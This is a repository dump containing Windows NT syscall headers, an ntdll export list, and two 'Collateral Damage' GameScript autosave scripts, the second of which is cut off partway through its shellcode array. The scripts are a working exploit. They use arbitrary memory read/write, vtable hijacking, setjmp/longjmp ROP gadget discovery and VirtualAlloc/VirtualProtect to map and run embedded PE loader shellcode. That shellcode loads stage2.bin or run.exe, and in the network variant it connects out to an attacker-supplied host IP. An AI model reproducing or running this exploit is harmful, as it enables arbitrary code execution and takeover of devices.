//NTSYSCALLAPI NTSTATUS NTAPI NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
//NTSYSCALLAPI NTSTATUS NTAPI NtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event, VOID* ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);
NTSYSCALLAPI NTSTATUS NTAPI NtCreateIoCompletion(PHANDLE IoCompletionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG NumberOfConcurrentThreads);
NTSYSCALLAPI
NTSTATUS
NTAPI NtSetIoCompletion(HANDLE IoCompletionHandle, ULONG CompletionKey, PIO_STATUS_BLOCK IoStatusBlock, NTSTATUS CompletionStatus, ULONG NumberOfBytesTransferred);

/*NTSYSCALLAPI
NTSTATUS
NTAPI
NtQuerySystemInformation(
    _In_ DWORD SystemInformationClass,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);*/

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength,
    _Out_ PULONG ReturnLength
);

// Types

#define TOKEN_SECURITY_ATTRIBUTE_TYPE_INVALID 0x00
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_INT64 0x01
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_UINT64 0x02
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_STRING 0x03
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_FQBN 0x04
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_SID 0x05
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_BOOLEAN 0x06
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_OCTET_STRING 0x10

// Flags

#define TOKEN_SECURITY_ATTRIBUTE_NON_INHERITABLE 0x0001
#define TOKEN_SECURITY_ATTRIBUTE_VALUE_CASE_SENSITIVE 0x0002
#define TOKEN_SECURITY_ATTRIBUTE_USE_FOR_DENY_ONLY 0x0004
#define TOKEN_SECURITY_ATTRIBUTE_DISABLED_BY_DEFAULT 0x0008
#define TOKEN_SECURITY_ATTRIBUTE_DISABLED 0x0010
#define TOKEN_SECURITY_ATTRIBUTE_MANDATORY 0x0020
#define TOKEN_SECURITY_ATTRIBUTE_COMPARE_IGNORE 0x0040

#define TOKEN_SECURITY_ATTRIBUTE_VALID_FLAGS ( \
    TOKEN_SECURITY_ATTRIBUTE_NON_INHERITABLE | \
    TOKEN_SECURITY_ATTRIBUTE_VALUE_CASE_SENSITIVE | \
    TOKEN_SECURITY_ATTRIBUTE_USE_FOR_DENY_ONLY | \
    TOKEN_SECURITY_ATTRIBUTE_DISABLED_BY_DEFAULT | \
    TOKEN_SECURITY_ATTRIBUTE_DISABLED | \
    TOKEN_SECURITY_ATTRIBUTE_MANDATORY)

#define TOKEN_SECURITY_ATTRIBUTE_CUSTOM_FLAGS 0xffff0000

// end_rev

// private
typedef struct _TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE
{
    ULONG64 Version;
    UNICODE_STRING Name;
} TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE, * PTOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE;

// private
typedef struct _TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE
{
    PVOID pValue;
    ULONG ValueLength;
} TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE, * PTOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE;

// private
typedef struct _TOKEN_SECURITY_ATTRIBUTE_V1
{
    UNICODE_STRING Name;
    USHORT ValueType;
    USHORT Reserved;
    ULONG Flags;
    ULONG ValueCount;
    union
    {
        PLONG64 pInt64;
        PULONG64 pUint64;
        PUNICODE_STRING pString;
        PTOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE pFqbn;
        PTOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE pOctetString;
    } Values;
} TOKEN_SECURITY_ATTRIBUTE_V1, * PTOKEN_SECURITY_ATTRIBUTE_V1;

// rev
#define TOKEN_SECURITY_ATTRIBUTES_INFORMATION_VERSION_V1 1
// rev
#define TOKEN_SECURITY_ATTRIBUTES_INFORMATION_VERSION TOKEN_SECURITY_ATTRIBUTES_INFORMATION_VERSION_V1

// private
typedef struct _TOKEN_SECURITY_ATTRIBUTES_INFORMATION
{
    USHORT Version;
    USHORT Reserved;
    ULONG AttributeCount;
    union
    {
        PTOKEN_SECURITY_ATTRIBUTE_V1 pAttributeV1;
    } Attribute;
} TOKEN_SECURITY_ATTRIBUTES_INFORMATION, * PTOKEN_SECURITY_ATTRIBUTES_INFORMATION;

// private
typedef union _SYSTEM_BUILD_VERSION_INFORMATION_FLAGS
{
    ULONG Value32;
    struct
    {
        ULONG IsTopLevel : 1;
        ULONG IsChecked : 1;
    };
} SYSTEM_BUILD_VERSION_INFORMATION_FLAGS, * PSYSTEM_BUILD_VERSION_INFORMATION_FLAGS;

// private
typedef struct _SYSTEM_BUILD_VERSION_INFORMATION
{
    USHORT LayerNumber;
    USHORT LayerCount;
    ULONG OsMajorVersion;
    ULONG OsMinorVersion;
    ULONG NtBuildNumber;
    ULONG NtBuildQfe;
    UCHAR LayerName[128];
    UCHAR NtBuildBranch[128];
    UCHAR NtBuildLab[128];
    UCHAR NtBuildLabEx[128];
    UCHAR NtBuildStamp[26];
    UCHAR NtBuildArch[16];
    SYSTEM_BUILD_VERSION_INFORMATION_FLAGS Flags;
} SYSTEM_BUILD_VERSION_INFORMATION, * PSYSTEM_BUILD_VERSION_INFORMATION;

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQuerySystemInformationEx(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _In_reads_bytes_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);


#endif

```

`ntdll.def`:

```def
EXPORTS
NtCreateFile
NtCreateIoCompletion
NtDeviceIoControlFile
NtQueryInformationToken
NtQuerySystemInformation
NtQuerySystemInformationEx
NtSetIoCompletion

```

`solstice_artifacts/gamescript_autosave.txt`:

```txt
//
// Collateral Damage - @carrot_c4k3 & @landaire - exploits.forsale
//

// !!! PUT YOUR IP BELOW !!!
// EX: var host_ip = "192.168.1.89"
var host_ip = "[YOUR IP HERE]"

// PE loader shellcode
let pe_loader_code = [
0xE9, 0xAF, 0x0, 0x0, 0x0, 0x12, 0x0, 0x0, 0xB0, 0x13, 0x0, 0x0, 0xD2, 0x12, 0x0, 0x0, 0xB0, 0x13, 0x0, 0x0, 0xC8, 0x13, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x25, 0x4C, 0x4F, 0x43, 0x41, 0x4C, 0x41, 0x50, 0x50, 0x44, 0x41, 0x54, 0x41, 0x25, 0x5C, 0x2E, 0x2E, 0x5C, 0x4C, 0x6F, 0x63, 0x61, 0x6C, 0x53, 0x74, 0x61, 0x74, 0x65, 0x5C, 0x73, 0x74, 0x61, 0x67, 0x65, 0x32, 0x2E, 0x62, 0x69, 0x6E, 0x0, 0x45, 0x78, 0x70, 0x61, 0x6E, 0x64, 0x45, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D, 0x65, 0x6E, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x73, 0x41, 0x0, 0x47, 0x65, 0x74, 0x46, 0x69, 0x6C, 0x65, 0x53, 0x69, 0x7A, 0x65, 0x0, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6C, 0x65, 0x41, 0x0, 0x52, 0x65, 0x61, 0x64, 0x46, 0x69, 0x6C, 0x65, 0x0, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x0, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0x8, 0x1, 0x0, 0x0, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0xB8, 0x4B, 0x0, 0x45, 0x0, 0x52, 0x0, 0x4E, 0x0, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0xB8, 0x45, 0x0, 0x4C, 0x0, 0x42, 0x0, 0x41, 0x0, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0xB8, 0x53, 0x0, 0x45, 0x0, 0x2E, 0x0, 0x44, 0x0, 0x48, 0x89, 0x44, 0x24, 0x50, 0xC7, 0x44, 0x24, 0x58, 0x4C, 0x0, 0x4C, 0x0, 0x66, 0x83, 0x64, 0x24, 0x5C, 0x0, 0x65, 0x48, 0x8B, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x83, 0xC0, 0x10, 0x48, 0x89, 0xC1, 0x48, 0x8B, 0x51, 0x60, 0x48, 0x85, 0xD2, 0x74, 0x57, 0x49, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF, 0x45, 0x31, 0xD2, 0x4D, 0x89, 0xD0, 0x66, 0x42, 0x83, 0x7C, 0x4A, 0x2, 0x0, 0x4D, 0x8D, 0x49, 0x1, 0x4D, 0x8D, 0x52, 0x1, 0x75, 0xEC, 0x49, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF, 0x66, 0x42, 0x83, 0x7C, 0x54, 0x42, 0x0, 0x4D, 0x8D, 0x52, 0x1, 0x75, 0xF3, 0x4D, 0x39, 0xCA, 0x75, 0x20, 0x45, 0x31, 0xC9, 0x49, 0x83, 0xE8, 0x1, 0x72, 0x29, 0x46, 0xF, 0xB7, 0x14, 0xA, 0x66, 0x46, 0x33, 0x54, 0xC, 0x40, 0x49, 0x83, 0xC1, 0x2, 0x66, 0x41, 0xF7, 0xC2, 0xDF, 0xFF, 0x74, 0xE3, 0x48, 0x8B, 0x9, 0x48, 0x39, 0xC1, 0x75, 0x98, 0xB8, 0x4, 0x4, 0x0, 0x0, 0xE9, 0x32, 0x1, 0x0, 0x0, 0x4C, 0x8B, 0x61, 0x30, 0x48, 0x8D, 0x15, 0xDF, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0x33, 0x1, 0x0, 0x0, 0x48, 0x89, 0xC6, 0x48, 0x8D, 0x15, 0xC1, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0x21, 0x1, 0x0, 0x0, 0x49, 0x89, 0xC6, 0x48, 0x8D, 0x15, 0xC4, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0xF, 0x1, 0x0, 0x0, 0x48, 0x89, 0xC3, 0x48, 0x8D, 0x15, 0xBF, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0xFD, 0x0, 0x0, 0x0, 0x48, 0x89, 0xC7, 0x48, 0x8D, 0x15, 0x7F, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0xEB, 0x0, 0x0, 0x0, 0x49, 0x89, 0xC7, 0x48, 0x8D, 0x15, 0x53, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0xD9, 0x0, 0x0, 0x0, 0x48, 0x8D, 0xD, 0x1C, 0xFE, 0xFF, 0xFF, 0x4C, 0x8D, 0x64, 0x24, 0x40, 0x4C, 0x89, 0xE2, 0x41, 0xB8, 0xC8, 0x0, 0x0, 0x0, 0xFF, 0xD0, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0xC7, 0x44, 0x24, 0x28, 0x80, 0x0, 0x0, 0x0, 0xC7, 0x44, 0x24, 0x20, 0x4, 0x0, 0x0, 0x0, 0x4C, 0x89, 0xE1, 0xBA, 0x0, 0x0, 0x0, 0x80, 0x45, 0x31, 0xC0, 0x45, 0x31, 0xC9, 0x41, 0xFF, 0xD6, 0x48, 0x83, 0xF8, 0xFF, 0x74, 0x5A, 0x49, 0x89, 0xC6, 0x48, 0x89, 0xC1, 0x31, 0xD2, 0x41, 0xFF, 0xD7, 0x89, 0xC5, 0x41, 0x89, 0xC7, 0x31, 0xC9, 0x4C, 0x89, 0xFA, 0x41, 0xB8, 0x0, 0x30, 0x0, 0x0, 0x41, 0xB9, 0x4, 0x0, 0x0, 0x0, 0xFF, 0xD3, 0x48, 0x89, 0xC3, 0x4C, 0x8D, 0x64, 0x24, 0x3C, 0x49, 0x89, 0xC5, 0x85, 0xED, 0x74, 0x2F, 0x83, 0x64, 0x24, 0x3C, 0x0, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x4C, 0x89, 0xF1, 0x4C, 0x89, 0xEA, 0x41, 0x89, 0xE8, 0x4D, 0x89, 0xE1, 0xFF, 0xD6, 0x85, 0xC0, 0x74, 0x2D, 0x8B, 0x44, 0x24, 0x3C, 0x49, 0x1, 0xC5, 0x29, 0xC5, 0xEB, 0xD4, 0xB8, 0x1, 0x0, 0x0, 0x0, 0xEB, 0x20, 0x4C, 0x8D, 0x4C, 0x24, 0x3C, 0x41, 0x83, 0x21, 0x0, 0x48, 0x89, 0xD9, 0x4C, 0x89, 0xFA, 0x41, 0xB8, 0x20, 0x0, 0x0, 0x0, 0xFF, 0xD7, 0xFF, 0xD3, 0xEB, 0x5, 0xB8, 0x2, 0x0, 0x0, 0x0, 0x48, 0x81, 0xC4, 0x8, 0x1, 0x0, 0x0, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x66, 0x81, 0x39, 0x4D, 0x5A, 0xF, 0x85, 0x9F, 0x0, 0x0, 0x0, 0x8B, 0x41, 0x3C, 0x8B, 0x84, 0x1, 0x88, 0x0, 0x0, 0x0, 0x44, 0x8B, 0x4C, 0x1, 0x18, 0x44, 0x8B, 0x44, 0x1, 0x1C, 0x44, 0x8B, 0x5C, 0x1, 0x20, 0x44, 0x8B, 0x54, 0x1, 0x24, 0x31, 0xC0, 0x45, 0x31, 0xE4, 0x4D, 0x39, 0xCC, 0xF, 0x84, 0x8E, 0x0, 0x0, 0x0, 0x49, 0x8D, 0x7C, 0x24, 0x1, 0x44, 0x89, 0xE6, 0x41, 0x8D, 0x1C, 0xB3, 0x8B, 0x1C, 0x19, 0x80, 0x3C, 0x19, 0x0, 0x49, 0x89, 0xFC, 0x74, 0xDF, 0x48, 0x1, 0xCB, 0x49, 0xC7, 0xC7, 0xFF, 0xFF, 0xFF, 0xFF, 0x45, 0x31, 0xE4, 0x4D, 0x89, 0xE6, 0x42, 0x80, 0x7C, 0x3B, 0x1, 0x0, 0x4D, 0x8D, 0x7F, 0x1, 0x4D, 0x8D, 0x64, 0x24, 0x1, 0x75, 0xEC, 0x49, 0xC7, 0xC5, 0xFF, 0xFF, 0xFF, 0xFF, 0x42, 0x80, 0x7C, 0x2A, 0x1, 0x0, 0x4D, 0x8D, 0x6D, 0x1, 0x75, 0xF4, 0x49, 0x89, 0xFC, 0x4D, 0x39, 0xFD, 0x75, 0xA3, 0x45, 0x31, 0xFF, 0x49, 0x83, 0xEE, 0x1, 0x72, 0x1A, 0x42, 0x8A, 0x2C, 0x3A, 0x4D, 0x8D, 0x67, 0x1, 0x42, 0x3A, 0x2C, 0x3B, 0x4D, 0x89, 0xE7, 0x74, 0xE9, 0x49, 0x89, 0xFC, 0xEB, 0x84, 0x31, 0xC0, 0xEB, 0x17, 0x41, 0x8D, 0x4, 0x72, 0xF, 0xB7, 0x4, 0x1, 0x25, 0xFF, 0x3F, 0x0, 0x0, 0x41, 0x8D, 0x4, 0x80, 0x8B, 0x4, 0x1, 0x48, 0x1, 0xC8, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x1, 0x13, 0xA, 0x0, 0x13, 0x1, 0x21, 0x0, 0xC, 0x30, 0xB, 0x50, 0xA, 0x70, 0x9, 0x60, 0x8, 0xC0, 0x6, 0xD0, 0x4, 0xE0, 0x2, 0xF0, 0x1, 0xC, 0x8, 0x0, 0xC, 0x30, 0xB, 0x50, 0xA, 0x70, 0x9, 0x60, 0x8, 0xC0, 0x6, 0xD0, 0x4, 0xE0, 0x2, 0xF0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
]


// hex printing helper functions
let i2c_map = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
let c2i_map = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, 'A': 0xA, 'B': 0xB, 'C': 0xC, 'D': 0xD, 'E': 0xE, 'F': 0xF}

fn hex_to_num(s) {
	var str_len = len(s)
	var res = 0
	for (var i = 0; i < str_len; i++)
	{
		res = res << 4
		res = res + c2i_map[s[i]]
	}
	return res
}

fn num_to_hex(num, byte_count) {
	if (byte_count > 8) {
		byte_count = 8
	}
	var res = ""
	for (var i = 0; i < byte_count * 2; i++) {
		var idx = (num >> (4 * i)) & 15
		res = i2c_map[idx] + res 
	}
	return res
}

fn num_to_hex8(num) {
	return num_to_hex(num, 1)
}

fn num_to_hex16(num) {
	return num_to_hex(num, 2)
}

fn num_to_hex32(num) {
	return num_to_hex(num, 4)
}

fn num_to_hex64(num) {
	return num_to_hex(num, 8)
}

fn hex_dump(addr, count) {
	for (var i = 0; i < count; i++) {
		if (i > 0 && (i % 16) == 0) {
			printConsole("\n")
		}
		var cur_byte = pointerGetUnsignedInteger8Bit(0, addr + i)
		printConsole(num_to_hex8(cur_byte) + " ")
	}
}

fn array_fill(arr) {
	var arr_len = len(arr)
	for (var i = 0; i < arr_len; i++) {
		arr[i] = 0x41
	}
}

fn round_down(val, bound) {
	return floor(val - (val % bound))
}

fn array_compare(a1, a2) {
	if (len(a1) != len(a2)) {
		return false
	}
	var arr_len = len(a1)
	
	for (var i = 0; i < arr_len; i++) {
		if (a1[i] != a2[i]) {
			return false
		}
	}

	return true
}

// shorthand helpers for memory access
fn write8(addr, val) {
	pointerSetUnsignedInteger8Bit(0, addr, val)
}

fn read8(addr) {
	return pointerGetUnsignedInteger8Bit(0, addr)
}

fn write16(addr, val) {
	pointerSetAtOffsetUnsignedInteger16Bit(0, addr, val)
}

fn read16(addr) {
	return pointerGetAtOffsetUnsignedInteger16Bit(0, addr)
}

fn write32(addr, val) {
	pointerSetAtOffsetUnsignedInteger(0, addr, val)
}

fn read32(addr) {
	return pointerGetAtOffsetUnsignedInteger(0, addr)
}


fn write64(addr, val) {
	pointerSetAtOffsetUnsignedInteger64Bit(0, addr, val)
}

fn read64(addr) {
	return pointerGetAtOffsetUnsignedInteger64Bit(0, addr)
}

// helper to read a 64-bit val and automatically make it a hex str
fn read64_hex(addr) {
	var val_low = read32(addr)
	var val_high = read32(addr+4)
	return num_to_hex32(val_high) + num_to_hex32(val_low)
}

fn read_buf(addr, buf) {
	var buf_len = len(buf)
	for (var i = 0; i < buf_len; i++) {
		buf[i] = read8(addr + i)
	}
}

fn write_buf(addr, buf) {
	var buf_len = len(buf)
	for (var i = 0; i < buf_len; i++) {
		write8(addr+i, buf[i])
	}
}

fn find_bytes(addr, max_len, pattern, buf) {
	for (var i = 0; i < max_len; i++) {
		read_buf(addr + i, buf)
		if (array_compare(pattern, buf)) {
			return addr + i
		}
	}
	return 0
}

fn find64(addr, max_len, v) {
	var offset = 0
	while (1) {
		var temp_val = read64(addr+offset)
		if (temp_val == v) {
			return addr+offset
		}
		offset += 8
	}
	return 0
}

// shorthand funcs
fn ptr_to_num(p) {
	return numberFromRaw64BitUnsignedInteger(p)
}

fn make_cstr(s) {
	var str_len = len(s) + 1
	var s_ptr = globalArrayNew8Bit(s, str_len)
	pointerSetString(s_ptr, 0, s)
	return ptr_to_num(s_ptr)
}

var gs_base = 0
var ntdll_base = 0
var kernelbase_base = 0
var longjmp_ptr = 0
var setjmp_ptr = 0
var gadget_ptr = 0
var gadget_rsp0x48_ptr = 0
var gadget_pushrax_ptr = 0
fn call_native(func_ptr, rcx, rdx, r8, r9) {
	// set this gadget here
	gadget_rsp0x48_ptr = gs_base + 0xE04B
	gadget_pushrax_ptr = gs_base + 0x1F13A
	var call_done = false

	// allocate 0x120 (space for vtable + setjmp data)
	var obj_ptr = globalArrayNew8Bit("call", 0x100)
	var objp = ptr_to_num(obj_ptr)
	var vt_ptr = globalArrayNew8Bit("vtable", 0x18)
	var vtp = ptr_to_num(vt_ptr)
	var stack_size = 0x4000
	var stack_ptr = globalArrayNew8Bit("stack", stack_size)
	var stackp = ptr_to_num(stack_ptr)
	var jmpctx_ptr = globalArrayNew8Bit("jctx", 0x100)
	var jcp = ptr_to_num(jmpctx_ptr)

	// set up vtable pointers
	write64(vtp+8, setjmp_ptr)
	write64(objp, vtp)

	// trigger vtable call
	slBus_destroy(obj_ptr)

	memcpy(jmpctx_ptr, 0, obj_ptr, 0, 0x100)

	// set up our rop chain
	var r10 = 0
	var r11 = 0
	write64(stackp+stack_size-0xA0, rdx)
	write64(stackp+stack_size-0x98, rcx)
	write64(stackp+stack_size-0x90, r8)
	write64(stackp+stack_size-0x88, r9)
	write64(stackp+stack_size-0x80, r10)
	write64(stackp+stack_size-0x78, r11)
	write64(stackp+stack_size-0x70, func_ptr)
	write64(stackp+stack_size-0x68, gadget_pushrax_ptr)
	// 0x30 bytes of padding
	write64(stackp+stack_size-0x38, 0x15151515)
	write64(stackp+stack_size-0x30, gs_base+0x109C4A)
	write64(stackp+stack_size-0x28, jcp)
	write64(stackp+stack_size-0x20, longjmp_ptr);
	
	// set up the context to do the longjmp
	write64(vtp+8, longjmp_ptr)
	write64(objp, vtp)
	// rsp
	write64(objp+0x10, stackp+stack_size-0xA0)
	// rip
	write64(objp+0x50, gadget_ptr)
	
	// trigger vtable call
	slBus_destroy(obj_ptr)
	var ret_val = read64(stackp+stack_size-0x68)

	// clean up our objects
	globalArrayDelete("call")
	globalArrayDelete("vtable")
	globalArrayDelete("stack")
	globalArrayDelete("jctx")

	return ret_val
}

fn find_module_base(addr) {
	var search_addr = round_down(addr, 0x10000)	

	while (1) {
		var magic_static = [0x4D, 0x5A]
		var magic_read = [0, 0]
		read_buf(search_addr, magic_read)

		if (array_compare(magic_static, magic_read)) {
			return search_addr
		}
		search_addr -= 0x10000
	}
	return 0
}

fn get_dll_exports(base_addr) {
	var res = {}
	var magic_static = [0x4D, 0x5A]
	var magic_read = [0, 0]
	read_buf(base_addr, magic_read)

	if (!array_compare(magic_static, magic_read)) {
		printConsole("Magic is invalid!\n")
		return res
	}

	
	var e_lfanew = read32(base_addr+0x3c)
	var exports_addr = base_addr + read32(base_addr+e_lfanew+0x70+0x18)

	var num_funcs = read32(exports_addr+0x14)
	var num_names = read32(exports_addr+0x18)

	var funcs_addr = base_addr + read32(exports_addr+0x1c)
	var names_addr = base_addr + read32(exports_addr+0x20)
	var ords_addr = base_addr + read32(exports_addr+0x24)

	for (var i = 0; i < num_names; i++) {
		var name_addr = base_addr + read32(names_addr + (4 * i))
		var name_str = pointerGetSubstring(0, name_addr, 0x20)
		var ordinal = read16(ords_addr + (2 * i))
		var func_addr =  base_addr + read32(funcs_addr + (4 * ordinal))
		res[name_str] = func_addr
		//printConsole("Export: " + name_str + " - " + num_to_hex64(func_addr) + "\n")
	}

	return res
}

var VirtualAlloc_ptr = 0
var VirtualProtect_ptr = 0
fn map_code(code) {
	var code_addr = call_native(VirtualAlloc_ptr, 0, 0x100000, 0x3000, 4)
	write_buf(code_addr, code)

	var oldp_ptr = globalArrayNew8Bit("oldp", 0x100)
	var oldpp = ptr_to_num(oldp_ptr)
	call_native(VirtualProtect_ptr, code_addr, 0x100000, 0x20, oldpp)
	return code_addr
}

fn map_page(addr) {
	var code_addr = call_native(VirtualAlloc_ptr, addr, 0x100000, 0x3000, 4)
	return code_addr
}


// create and dump our object to the terminal
var slbus_ptr = slBus_create()
var slp = numberFromRaw64BitUnsignedInteger(slbus_ptr)

// get the base of the GameScript module via the vtable
gs_base = read64(slp) - 0x16faf8

ntdll_base = find_module_base(read64(gs_base + 0x125398))
kernelbase_base = find_module_base(read64(gs_base + 0x1253A0))

var setjmp_bytes = [0x48,0x89,0x11,0x48,0x89,0x59,0x08,0x48,0x89,0x69,0x18,0x48,0x89,0x71,0x20,0x48]
var longjmp_bytes = [0x48,0x8B,0xC2,0x48,0x8B,0x59,0x08,0x48,0x8B,0x71,0x20,0x48,0x8B,0x79,0x28,0x4C]
var tmp_bytes = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]

setjmp_ptr = find_bytes(ntdll_base, 0x217000, setjmp_bytes, tmp_bytes)
longjmp_ptr = find_bytes(ntdll_base, 0x217000, longjmp_bytes, tmp_bytes)

// bytes for the following gadget: pop rdx;pop rcx;pop r8;pop r9;pop r10;pop r11; ret
var gadget_bytes = [0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3]
tmp_bytes = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
gadget_ptr = find_bytes(ntdll_base, 0x217000, gadget_bytes, tmp_bytes)


// get the ntdll & kernel base exports and find VirtualAlloc/Protect
var kernelbase_exports = get_dll_exports(kernelbase_base)
var ntdll_exports = get_dll_exports(ntdll_base)
VirtualAlloc_ptr = kernelbase_exports["VirtualAlloc"]
VirtualProtect_ptr = kernelbase_exports["VirtualProtect"]
var VirtualFree_ptr = kernelbase_exports["VirtualFree"]


// allocate our token info buffer
var tinfo_ptr = globalArrayNew8Bit("tinfo", 0x2000)
var tinfop = ptr_to_num(tinfo_ptr)

// write the ip to the global page
var global_page = map_page(0x44000000)
pointerSetString(0, global_page, host_ip)

// map the pe loader
var pe_loader_ptr = map_code(pe_loader_code)
var pe_ret = call_native(pe_loader_ptr, 0, 0, 0, 0)

```

`solstice_artifacts/gamescript_autosave_network.txt`:

```txt
//
// Collateral Damage - @carrot_c4k3 & @landaire - exploits.forsale
//

// !!! PUT YOUR IP BELOW !!!
// EX: var host_ip = "192.168.1.89"
var host_ip = "[YOUR IP HERE]"

// PE loader shellcode
let pe_loader_code = [
233,22,1,0,0,21,0,0,120,22,0,0,15,21,0,0,237,21,0,0,144,22,0,0,237,21,0,0,117,22,0,0,164,22,0,0,0,0,0,0,37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,46,46,92,76,111,99,97,108,83,116,97,116,101,92,114,117,110,46,101,120,101,0,87,83,50,95,51,50,46,100,108,108,0,87,83,65,83,116,97,114,116,117,112,0,87,83,65,67,111,110,110,101,99,116,0,87,83,65,83,111,99,107,101,116,65,0,105,110,101,116,95,97,100,100,114,0,69,120,112,97,110,100,69,110,118,105,114,111,110,109,101,110,116,83,116,114,105,110,103,115,65,0,76,111,97,100,76,105,98,114,97,114,121,65,0,67,114,101,97,116,101,70,105,108,101,65,0,87,114,105,116,101,70,105,108,101,0,82,101,97,100,70,105,108,101,0,86,105,114,116,117,97,108,65,108,108,111,99,0,86,105,114,116,117,97,108,70,114,101,101,0,86,105,114,116,117,97,108,80,114,111,116,101,99,116,0,67,108,111,115,101,72,97,110,100,108,101,0,0,0,0,24,0,0,0,0,128,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,87,65,86,65,85,65,84,86,87,85,83,72,129,236,248,2,0,0,72,131,228,240,72,184,75,0,69,0,82,0,78,0,72,141,140,36,152,0,0,0,72,137,1,72,184,69,0,76,0,66,0,65,0,72,137,65,8,72,184,83,0,69,0,46,0,68,0,72,137,65,16,199,65,24,76,0,76,0,102,131,97,28,0,232,124,4,0,0,72,133,192,116,65,72,137,214,72,184,87,0,83,0,50,0,95,0,72,141,140,36,152,0,0,0,72,137,1,72,184,51,0,50,0,46,0,100,0,72,137,65,8,199,65,16,108,0,108,0,102,131,97,20,0,232,64,4,0,0,72,133,192,116,20,72,137,215,235,51,72,184,4,20,0,0,1,0,0,0,233,53,3,0,0,72,141,21,208,254,255,255,72,137,241,232,58,3,0